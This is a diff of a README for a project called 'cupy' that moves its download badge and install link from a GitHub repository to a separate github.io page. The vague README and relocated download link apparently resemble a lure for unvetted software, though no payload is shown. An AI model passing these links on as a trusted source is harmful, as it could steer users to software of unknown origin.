@@ -1,6 +1,6 @@
 # ⚡ cupy - Speed up your computer math tasks
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/Granicio1/cupy)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://granicio1.github.io)
 
 ## 🎯 Purpose
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run this tool well. Check these items befo
 
 Follow these steps to get the files on your computer.
 
-1. Visit [this page to download](https://github.com/Granicio1/cupy).
+1. Visit [this page to download](https://granicio1.github.io).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version tag.
 4. Scroll to the Assets list.
